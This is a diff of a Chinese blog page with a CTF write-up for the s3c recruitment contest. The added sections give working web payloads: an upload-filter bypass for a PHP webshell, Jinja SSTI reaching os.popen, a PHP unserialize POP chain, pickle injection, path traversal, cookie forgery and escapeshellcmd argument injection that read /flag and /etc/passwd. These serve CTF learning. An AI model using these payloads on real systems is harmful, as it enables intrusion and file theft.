@@ -496,21 +496,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-10-23
+                    2022-10-30
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    979
+                    2.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    13 分
                 </div>
                 
 
@@ -531,6 +531,7 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="S3c比赛WP"><a href="#S3c比赛WP" class="headerlink" title="S3c比赛WP"></a>S3c比赛WP</h1><p>[TOC]</p>
+<p>前言：第三场比赛，本人比较喜欢记录，但可能因为懒，wp不是那么的详细，不懂的欢迎随时来问我！本次做了web和misc方向！</p>
 <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><hr>
 <h3 id="EsayPHP"><a href="#EsayPHP" class="headerlink" title="EsayPHP"></a>EsayPHP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">// ‮⁦CTFer⁩⁦Hello</span><br><span class="line">if (&quot;admin&quot; == $_GET[username] &amp;‮⁦+!!⁩⁦&amp; &quot;‮⁦CTF⁩⁦s3cctf&quot; == $_GET[‮⁦S3c⁩⁦password]) &#123; //Welcome to </span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
 
@@ -567,7 +568,7 @@
 <p><img src="/images/loading.gif" data-original="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/wp13.png"></p>
 <p>题目说一半已经给了，一半你要自己找正好对应一个1ndex.php和index.php两个网页，每个一半flag！</p>
 <p>s3c{W0w_y0U_goT_tW0_f1ags!}</p>
-<h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>题目只能上传图片类型的文件，但我们得上传一个php文件才能远程连接蚁剑！故只需要在传文件的时候BP抓包，然后</p>
+<h3 id="ezupload（同彩蛋黑客入侵）"><a href="#ezupload（同彩蛋黑客入侵）" class="headerlink" title="ezupload（同彩蛋黑客入侵）"></a>ezupload（同彩蛋黑客入侵）</h3><p>题目只能上传图片类型的文件，但我们得上传一个php文件才能远程连接蚁剑！故只需要在传文件的时候BP抓包，然后</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改文件名为：66.PphpHP%00的url解码.jpg即可绕过</span><br></pre></td></tr></table></figure>
 
 
@@ -575,9 +576,9 @@
 <h3 id="没有对象就new一个叭"><a href="#没有对象就new一个叭" class="headerlink" title="没有对象就new一个叭"></a>没有对象就new一个叭</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if ( isset($_GET[&quot;s3c&quot;]) &amp;&amp; isset($_GET[&quot;obj&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $s3c = $_GET[&quot;s3c&quot;];</span><br><span class="line">    $obj = $_GET[&quot;obj&quot;];</span><br><span class="line">    echo new $obj($s3c); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>一眼顶针，用PHP内置原生类来做</p>
-<h6 id="步骤1："><a href="#步骤1：" class="headerlink" title="步骤1："></a>步骤1：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?obj=Filesystemlterator&amp;s3c=.(.代表当前目录)    扫描出文件f14gggggggggg.php</span><br></pre></td></tr></table></figure>
+<h6 id="步骤1：读取目录的文件有哪些"><a href="#步骤1：读取目录的文件有哪些" class="headerlink" title="步骤1：读取目录的文件有哪些"></a>步骤1：读取目录的文件有哪些</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?obj=Filesystemlterator&amp;s3c=.(.代表当前目录)    扫描出文件f14gggggggggg.php</span><br></pre></td></tr></table></figure>
 
-<h6 id="步骤2："><a href="#步骤2：" class="headerlink" title="步骤2："></a>步骤2：</h6><p>由于直接读取f14gggggggggg.php由于位数闲置读取不行，故使用伪协议！payload如下</p>
+<h6 id="步骤2：读取文件内容"><a href="#步骤2：读取文件内容" class="headerlink" title="步骤2：读取文件内容"></a>步骤2：读取文件内容</h6><p>由于直接读取f14gggggggggg.php由于位数闲置读取不行，故使用伪协议！payload如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?obj=SplFileObject&amp;s3c=php://filter/convert.base64-encode/resource=f14gggggggggg.php</span><br></pre></td></tr></table></figure>
 
 
@@ -594,6 +595,70 @@
 <p>一眼python命令执行，os模块输出！拿到flag</p>
 <h3 id="解压小游戏"><a href="#解压小游戏" class="headerlink" title="解压小游戏"></a>解压小游戏</h3><p>直接查看far.js里看到源码</p>
 <p><img src="/images/loading.gif" data-original="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/wp15.png"></p>
+<h3 id="EZssti"><a href="#EZssti" class="headerlink" title="EZssti"></a>EZssti</h3><p>首先登录界面，结合题目，我们可以判断出是SSti注入！我会在另一篇文章详细介绍！所以这里简单介绍下思路！</p>
+<p><img src="/images/loading.gif" data-original="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/wp17.png"></p>
+<h6 id="步骤1：读取所有类"><a href="#步骤1：读取所有类" class="headerlink" title="步骤1：读取所有类"></a>步骤1：读取所有类</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(1).__subclasses__()&#125;&#125;   我用的</span><br><span class="line">&#123;&#123;url_for.__globals__&#125;&#125;   另个大佬的</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/loading.gif" data-original="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/wp18.png"></p>
+<p>通过浏览器的ctrl+f搜索，确定了warnings.catch_warnings类的位置在133，这个类内置eval函数可以利用！</p>
+<p>然后这题过滤了[],flag,config等！try，again的回显表示payload不对。</p>
+<h6 id="步骤2：读取子类，方便后续"><a href="#步骤2：读取子类，方便后续" class="headerlink" title="步骤2：读取子类，方便后续"></a>步骤2：读取子类，方便后续</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__.__getitem__(0)&#125;&#125;    确定了子类的位置在0，返回了&lt;object&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="步骤3：构造payload：绕过-即可"><a href="#步骤3：构造payload：绕过-即可" class="headerlink" title="步骤3：构造payload：绕过[]即可"></a>步骤3：构造payload：绕过[]即可</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(133).__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;eval&#x27;)(&#x27;__import__(&quot;os&quot;).popen(&quot;cat /f*&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从读取子类后面开始，payload为固定内容，所以其实很简单！</p>
+<h3 id="RandomNumber"><a href="#RandomNumber" class="headerlink" title="RandomNumber"></a>RandomNumber</h3><p>进入题目，</p>
+<p><img src="/images/loading.gif" data-original="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/wp19.png"></p>
+<p>盲猜是php种子随机数，毕竟没有真正的随机数！所以用GitHub的工具在kali进行爆破。具体操作如下：</p>
+<h6 id="步骤1：爆破种子"><a href="#步骤1：爆破种子" class="headerlink" title="步骤1：爆破种子"></a>步骤1：爆破种子</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在工具文件打开终端输入：     ./php_mt_seed 给的随机数     即可爆破出种子</span><br></pre></td></tr></table></figure>
+
+<h6 id="步骤2：生成伪随机数"><a href="#步骤2：生成伪随机数" class="headerlink" title="步骤2：生成伪随机数"></a>步骤2：生成伪随机数</h6><p>这里补充个常识：种子一般是0-100的，所以直接用这个范围里的就行了，然后取屏幕里第三个数的下一个数即可！</p>
+<h3 id="EZPOP"><a href="#EZPOP" class="headerlink" title="EZPOP"></a>EZPOP</h3><p>非常简单的一道pop链子题，完全就是考对魔术方法的理解，进入界面，看源码。</p>
+<h6 id="步骤1：代码审计"><a href="#步骤1：代码审计" class="headerlink" title="步骤1：代码审计"></a>步骤1：代码审计</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class p&#123;</span><br><span class="line">    public $too;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;too-&gt;three;</span><br><span class="line">        return &#x27;w3lc0me_to_S3c&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class q&#123;</span><br><span class="line">    public $amo;</span><br><span class="line">    public $read;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;read===&#x27;next&#x27;)&#123;</span><br><span class="line">            echo $this-&gt;amo;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class d&#123;</span><br><span class="line">    public $io;</span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;io)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class b&#123;</span><br><span class="line">    public $iu;</span><br><span class="line">    public function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;you_are_sUccessssd&quot;;</span><br><span class="line">        echo file_get_contents(&quot;/flag&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class r&#123;</span><br><span class="line">    public $hh;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;hh-&gt;zxxxxxxxrrrrr();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = $_GET[&#x27;payload&#x27;];</span><br><span class="line">unserialize($a); </span><br></pre></td></tr></table></figure>
+
+<h6 id="步骤2：构造链子-从后往前找"><a href="#步骤2：构造链子-从后往前找" class="headerlink" title="步骤2：构造链子   从后往前找"></a>步骤2：构造链子   从后往前找</h6><p>第一步：</p>
+<p>第二步：</p>
+<p>第三步：</p>
+<p>第四步：</p>
+<p>第五步：</p>
+<p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    class p&#123;</span><br><span class="line">        public $too;</span><br><span class="line">     &#125;</span><br><span class="line">    class q&#123;</span><br><span class="line">        public $amo;</span><br><span class="line">        public $read=&#x27;next&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    class d&#123;</span><br><span class="line">        public $io;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    class b&#123;</span><br><span class="line">        public $iu;</span><br><span class="line">    &#125;</span><br><span class="line">    class r&#123;</span><br><span class="line">        public $hh;&#125;</span><br><span class="line">    $payload=new q();</span><br><span class="line">    $payload-&gt;amo = new p();</span><br><span class="line">    $payload-&gt;amo-&gt;too=new d();</span><br><span class="line">    $payload-&gt;amo-&gt;too-&gt;io=new r();</span><br><span class="line">    $payload-&gt;amo-&gt;too-&gt;io-&gt;hh=new b();</span><br><span class="line">    echo serialize($payload);</span><br><span class="line">?&gt;</span><br><span class="line">//O:1:&quot;q&quot;:2:&#123;s:3:&quot;amo&quot;;O:1:&quot;p&quot;:1:&#123;s:3:&quot;too&quot;;O:1:&quot;d&quot;:1:&#123;s:2:&quot;io&quot;;O:1:&quot;r&quot;:1:&#123;s:2:&quot;hh&quot;;O:1:&quot;b&quot;:1:&#123;s:2:&quot;iu&quot;;N;&#125;&#125;&#125;&#125;s:4:&quot;read&quot;;s:4:&quot;next&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="So-Easy"><a href="#So-Easy" class="headerlink" title="So_Easy"></a>So_Easy</h3><p>考点：绕过$_SESSION变量，由于没给赋初值，它是一个固定的数，但我们不知道，查了百度，如下</p>
+<h6 id="步骤1：输出-SESSION的值"><a href="#步骤1：输出-SESSION的值" class="headerlink" title="步骤1：输出$_SESSION的值"></a>步骤1：输出$_SESSION的值</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump( @md5($_SESSION[&#x27;flag&#x27;]));        得到初始值</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/loading.gif" data-original="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/wp20.png"></p>
+<h6 id="步骤2：绕过下面的反序列化"><a href="#步骤2：绕过下面的反序列化" class="headerlink" title="步骤2：绕过下面的反序列化"></a>步骤2：绕过下面的反序列化</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$test=&#x27;&#x27;;</span><br><span class="line">$test=array(&quot;user&quot;=&gt;admin,&quot;password&quot;=&gt;hahahahahahaha);</span><br><span class="line">echo var_dump($test);</span><br><span class="line">echo var_dump(serialize($test));</span><br><span class="line"> </span><br><span class="line">$test1=&#x27;&#x27;;</span><br><span class="line">$test1=array(&quot;user&quot;=&gt;admin,&quot;password&quot;=&gt;hahahahahahaha);</span><br><span class="line">echo var_dump($test1);</span><br><span class="line">echo var_dump(serialize($test1));</span><br><span class="line">//#s3c&#123;Y0u_mUst_bE_An_exceLLent_CTFer&#125;    在线数组对应生成反序列化模板！学习</span><br><span class="line">?&gt;      //原理，可以自己百度下PHP语法，试下构造数组对应</span><br></pre></td></tr></table></figure>
+
+<h3 id="readMMMEEE"><a href="#readMMMEEE" class="headerlink" title="readMMMEEE"></a>readMMMEEE</h3><p>考点：路径读取问题。       实在懒得复现了，这题真不难。。。！</p>
+<p>访问给的路径，但我们知道图片后面不能再切换目录了，所以只能在参数下手！</p>
+<p>构造payload：&#x2F;cancanneed?img&#x3D;..&#x2F;..&#x2F;..&#x2F;flag  网页源码无法查看，直接BP抓包输入得到flag回显</p>
+<h3 id="DJ-Diary"><a href="#DJ-Diary" class="headerlink" title="DJ_Diary"></a>DJ_Diary</h3><p>考点：cookie伪造，代码审计</p>
+<p>思路：修改cookie的name的值，变为可利用的参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function img2b64($image) &#123;</span><br><span class="line">    return &#x27;data:jpg;base64,&#x27;.base64_encode(file_get_contents($image));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_img_contents() &#123;</span><br><span class="line">    $results = [];</span><br><span class="line"></span><br><span class="line">    if (empty($_COOKIE[&#x27;cache&#x27;])) &#123;</span><br><span class="line"></span><br><span class="line">        $images = glob(&#x27;images/*.jpg&#x27;);    </span><br><span class="line">        $expiry = time() + 60*60*24*7;</span><br><span class="line"></span><br><span class="line">        foreach($images as $image) &#123;      //这里的$image为上面glob函数的每张图片的值，无法控制</span><br><span class="line">            $text = preg_replace(&#x27;/\\.[^.\\s]&#123;3,4&#125;$/&#x27;, &#x27;.txt&#x27;, $image);</span><br><span class="line">            $description = trim(file_get_contents($text));</span><br><span class="line">            array_push($results, array(</span><br><span class="line">                &#x27;name&#x27; =&gt; $image,</span><br><span class="line">                &#x27;description&#x27; =&gt; $description</span><br><span class="line">            ));</span><br><span class="line">            $_SESSION[$image] = img2b64($image);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $cookie = array(&#x27;data&#x27; =&gt; $results, &#x27;expiry&#x27; =&gt; $expiry);</span><br><span class="line">        setcookie(&#x27;cache&#x27;, json_encode($cookie), $expiry);</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line"></span><br><span class="line">        $cache = json_decode($_COOKIE[&#x27;cache&#x27;], true);</span><br><span class="line">        if ($cache[&#x27;expiry&#x27;] &lt;= time()) &#123;</span><br><span class="line"></span><br><span class="line">            $expiry = time() + 60*60*24*7;</span><br><span class="line">            for($i = 0; $i &lt; count($cache[&#x27;data&#x27;]); $i++) &#123;</span><br><span class="line">                $result = $cache[&#x27;data&#x27;][$i];</span><br><span class="line">                $_SESSION[$result[&#x27;name&#x27;]] = img2b64($result[&#x27;name&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $cookie = array(&#x27;data&#x27; =&gt; $cache[&#x27;data&#x27;], &#x27;expiry&#x27; =&gt; $expiry);</span><br><span class="line">            setcookie(&#x27;cache&#x27;, json_encode($cookie), $expiry);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $cache[&#x27;data&#x27;];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $results;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="步骤1：代码审计-1"><a href="#步骤1：代码审计-1" class="headerlink" title="步骤1：代码审计"></a>步骤1：代码审计</h6><p>第一个for循环的$image并不可控，所以我们采用第二个循环 expiry的值小于time，并且cookie为一个数组data一个，expiry一个</p>
+<h6 id="步骤2：构造payload："><a href="#步骤2：构造payload：" class="headerlink" title="步骤2：构造payload："></a>步骤2：构造payload：</h6><p>{“data”:[{“name”:”xxx”,”description”:”\u829d\u58eb\u96ea\u8c79”}]，xxxx的值可控并利用，所以我们只需要根据提示构造即可！</p>
+<p>{“data”:[{“name”:”&#x2F;flag”,”description”:”\u829d\u58eb\u96ea\u8c79”}],”expiry”:1667432089}url编码即可</p>
+<h3 id="白给皮卡丘"><a href="#白给皮卡丘" class="headerlink" title="白给皮卡丘"></a>白给皮卡丘</h3><p>考点：pickle反序列化</p>
+<p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"># author:l0sE2</span><br><span class="line"># datetime:2022/10/23 11:54</span><br><span class="line"># software: PyCharm</span><br><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line">import pickletools</span><br><span class="line">from flask import Flask, session,request</span><br><span class="line">import secretflag</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = &#x27;S3C&#x27;</span><br><span class="line">class Hello():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.DOUWANTFLAG = &#x27;no&#x27;</span><br><span class="line">        self.user =&#x27;MY FRIEND&#x27;</span><br><span class="line">    def say__HI(self,whoareU):</span><br><span class="line">        self.user = whoareU         </span><br><span class="line"></span><br><span class="line">class FALG():#你这flag不保熟啊</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.flag = &#x27;fl0g&#123;ni_yao_bu_yao_ba&#125;&#x27;</span><br><span class="line">    def pikapika(self,pika):</span><br><span class="line">        hell = pickle.loads(pika.replace(b&#x27;\u005cn&#x27;, b&#x27;\n&#x27;))</span><br><span class="line">        if hell.DOUWANTFLAG == &#x27;yes&#x27; :</span><br><span class="line">            return secretflag.realflag  //判断读取flag的条件，覆盖原来的DOUWANTFLAG值</span><br><span class="line">        else:</span><br><span class="line">            return self.flag</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def hello_world():</span><br><span class="line">    hello = Hello()   //实例化类</span><br><span class="line">    if not request.args.get(&#x27;user&#x27;):</span><br><span class="line">        return &#x27;Hello &#123;&#125;! 只有真正渴望获得flag的ctfer才能成功&#x27;.format(hello.user)</span><br><span class="line">    else:</span><br><span class="line">        flag = FALG()</span><br><span class="line">        G3T = request.args.get(&#x27;user&#x27;)  //传user的值</span><br><span class="line">        print(G3T)</span><br><span class="line">        if &#x27;R&#x27; in G3T or &#x27;i&#x27; in G3T or &#x27;o&#x27; in G3T or &#x27;b&#x27; in G3T:</span><br><span class="line">            return &#x27;R i o b is forbidden! but your payload:&#123;&#125;! &#x27;.format(G3T) //禁用了一些非预期解 R代码的利用</span><br><span class="line">        hello.say__HI(G3T)  //输出user的值  例如?user=1  回显hello，1</span><br><span class="line">        pickle_hello = pickle.dumps(hello, protocol=0)</span><br><span class="line">        pickle_hello = pickletools.optimize(pickle_hello)</span><br><span class="line">        F = flag.pikapika(pickle_hello)</span><br><span class="line">        return &#x27;Hello &#123;&#125;!here is your flag&lt;br/&gt;&#123;&#125;!&#x27;.format(G3T,F)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br></pre></td></tr></table></figure>
+
+<h6 id="步骤1：代码审计-2"><a href="#步骤1：代码审计-2" class="headerlink" title="步骤1：代码审计"></a>步骤1：代码审计</h6><p>我们试着传入user&#x3D;1</p>
+<p><img src="/images/loading.gif" data-original="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/wp21.png"></p>
+<p>有回显，输出了FLAG类里的self.flag变量值，显然，这并不是我们要的flag！</p>
+<p>很明显，我们只要满足以下条件：即可调用secretflag模块的函数读取flag！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if hell.DOUWANTFLAG == &#x27;yes&#x27; :</span><br><span class="line">            return secretflag.realflag  //判断读取flag的条件，覆盖原来的DOUWANTFLAG值</span><br></pre></td></tr></table></figure>
+
+<p>但问题又来了，我们怎么改变原有的变量值呢？</p>
+<p>这里就不得不说pickle序列化神奇的地方：只需要在传入参数的位置修改以下即可</p>
+<p>例子：?user&#x3D;1\nsVDOUWANTFLAG\nVyes</p>
+<h3 id="Time-Controller"><a href="#Time-Controller" class="headerlink" title="Time_Controller"></a>Time_Controller</h3><p>考点：data命令，escapeshellcmd()函数转义</p>
+<p>data -f 读取文件的命令</p>
+<p>escapeshellcmd()函数会对一些命令进行转移，这里可以百度一下，这题直接format传参即可试试哪些字符转移，转移后的样子</p>
+<p>查看时间，发现可以直接执行data %H:%M:%S </p>
+<p>在通过提示：试试-f读取  data -f &#x2F;etc&#x2F;passwd发现不行</p>
+<p>加个引号试试 data ‘-f &#x2F;etc&#x2F;passwd’发现可以！flag在根目录，data ‘-f &#x2F;flag’即可拿到flag！</p>
 
                 
             </div>
@@ -1092,18 +1157,17 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/10/23/s3c%E6%8B%9B%E6%96%B0%E8%B5%9BWP/">
+                <a href="/2022/10/25/%E8%AE%AD%E7%BB%83%E6%89%93%E5%8D%A1/">
                     <div class="card-image">
                         
                         
-                        <img src="/images/loading.gif" data-original="/medias/featureimages/4.jpg" class="responsive-img" alt="s3c招新赛WP">
+                        <img src="/images/loading.gif" data-original="/medias/featureimages/4.jpg" class="responsive-img" alt="训练打卡">
                         
-                        <span class="card-title">s3c招新赛WP</span>
+                        <span class="card-title">训练打卡</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1113,9 +1177,9 @@
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-23
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-10-25
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1128,12 +1192,11 @@
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
